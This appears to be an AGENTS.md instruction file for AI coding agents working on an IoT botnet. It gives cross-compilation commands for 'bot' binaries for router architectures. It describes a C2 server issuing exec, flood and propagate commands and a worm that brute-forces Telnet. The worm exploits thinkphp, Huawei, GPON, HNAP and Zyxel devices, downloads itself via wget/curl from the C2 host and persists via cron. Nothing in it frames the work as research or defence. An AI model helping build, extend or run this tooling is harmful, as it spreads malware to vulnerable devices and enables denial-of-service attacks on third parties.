# AGENTS.md

## Build Commands

### Go Bot Binary (all architectures)
```bash
cd core/bot
export CGO_ENABLED=0

# Linux mipsle (little-endian MIPS routers) — primary target
GOOS=linux GOARCH=mipsle go build -ldflags "-s -w" -o bot-mipsle .

# Linux mips (big-endian MIPS routers)
GOOS=linux GOARCH=mips go build -ldflags "-s -w" -o bot-mips .

# Linux arm (IoT devices)
GOOS=linux GOARCH=arm go build -ldflags "-s -w" -o bot-arm .

# Linux arm64 (aarch64)
GOOS=linux GOARCH=arm64 go build -ldflags "-s -w" -o bot-arm64 .

# Linux 386 (x86)
GOOS=linux GOARCH=386 go build -ldflags "-s -w" -o bot-386 .

# Linux amd64 (x86_64)
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o bot-amd64 .

# Windows (for local testing on Windows host)
go build -o bot.exe .
```

### C Bot Binary (all architectures)
```bash
cd core/bot

# Cross-compile from WSL2/Ubuntu (requires gcc cross-compilers)
# Install: apt-get install gcc-mipsel-linux-gnu gcc-mips-linux-gnu gcc-arm-linux-gnueabihf gcc-aarch64-linux-gnu

# MIPS little-endian (primary IoT target, ~900KB stripped)
mipsel-linux-gnu-gcc -Os -s -static -o bot-mipsle agent.c -lpthread

# MIPS big-endian
mips-linux-gnu-gcc -Os -s -static -o bot-mips agent.c -lpthread

# ARM (hardfloat)
arm-linux-gnueabihf-gcc -Os -s -static -o bot-arm agent.c -lpthread

# ARM64
aarch64-linux-gnu-gcc -Os -s -static -o bot-arm64-c agent.c -lpthread

# Windows (native, via MSYS2 MinGW)
gcc -Os -s -o bot-amd64.exe agent.c -lws2_32
```

### Go Lint
```bash
cd core/bot
go vet .
```

### Python Lint
```bash
python -m py_compile main.py
python -m py_compile core/iot_agent/server.py
python -m py_compile core/iot_agent/explosives.py
python -m py_compile "BOT SCANNING-LOADING/infector/deployer.py"
python -m py_compile "BOT SCANNING-LOADING/brute forcer/bruteforce.py"
```

## Architecture Notes

### C Bot (primary payload — core/bot/agent.c)
- Tiny static C binary (~28KB Windows, ~900KB MIPS/ARM Linux) vs Go's ~4-5MB
- JSON protocol: `{"type": "register", ...}` newline-terminated, plain text
- Heartbeat: server sends `{"type": "heartbeat"}`; bot responds `{"type": "pong"}`
- Commands: `propagate` (starts scanner), `stop`, `exec`, `flood`, `ping`, `sysinfo`
- Propagation scanner: 3 Scout threads (non-blocking async TCP connect) + 40 Worker threads
  - Scouts use `connect()` + `select()`/`getsockopt(SO_ERROR)` for fast port detection
  - Workers block on `pthread_cond_wait` until scouts find open ports
  - Shared mutex-protected linked list queue for IP:port targets
  - `gen_subnet_prioritized_ip()`: 70% hit-list subnets (high-density /16s), 30% random
  - Bogon filtering via `is_bogon()` with iterative loop (no recursion)
  - Telnet brute-force on ports 23/2323
  - Web exploits: thinkphp, huawei, gpon80, hnap, zyxel on ports 80/8080/37215
  - Deploy downloads itself via `wget`/`curl` from `/agent/{arch}`
  - Persistence via cron

### Go Bot (fallback — core/bot/agent.go)
- Larger Go binary (~4MB stripped) for arches without C cross-compiler
- Same JSON protocol and command set as C bot
- Raw socket scanner (if privileges available) or TCP connect scanner fallback
- LCG-based IP generation with `hitListSubnets` density optimization

### C2 Server (core/iot_agent/server.py)
- Accepts bot connections, manages heartbeat
- `broadcast(command)` sends JSON commands to all connected bots
- `send_command(target_id, command)` sends to specific bot
- `list_agents()` returns connected bot info
- Auto-cascade: bots automatically propagate on infect

### C2 File Server (built into main.py)
- Serves bot binaries at `http://<public_host>:<public_port>/agent/{arch}`
- Architectures: mips, mipsle, arm, arm64, x86, x86_64
- Primary: C bot binaries (bot-mipsle, bot-mips, bot-arm)
- Fallback: Go binaries (bot-arm64, bot-386, bot-amd64)
- Server auto-selects: if arch request fails, falls back to mipsle/mips/arm

